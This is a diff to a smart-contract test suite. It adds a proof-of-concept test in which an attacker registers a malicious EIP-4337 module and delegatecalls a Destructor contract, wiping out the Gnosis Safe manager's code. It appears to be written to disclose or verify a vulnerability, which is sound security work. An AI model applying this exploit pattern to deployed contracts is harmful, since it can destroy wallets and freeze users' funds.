@@ -88,6 +88,16 @@ describe('Gnosis Proxy', function () {
     beneficiary = createAddress()
   })
 
+  it.only('PoC : selfdestruct', async function(){
+    const malicious = await(await ethers.getContractFactory("MaliciousEIP4337Manager")).deploy();
+    const attacker = (await ethers.getSigners())[10];
+    const destructor = await(await ethers.getContractFactory("Destructor")).deploy();
+    await malicious.set(attacker.address, attacker.address);
+    await manager.setup4337Modules(malicious.address);
+    await manager.connect(attacker).execTransactionFromModule(destructor.address, 0, "0x", 1);
+    expect(await ethers.provider.getCode(manager.address)).to.be.equal("0x");
+  })
+
   it('should validate', async function () {
     await manager.callStatic.validateEip4337(proxySafe.address, manager.address, { gasLimit: 10e6 })
   })
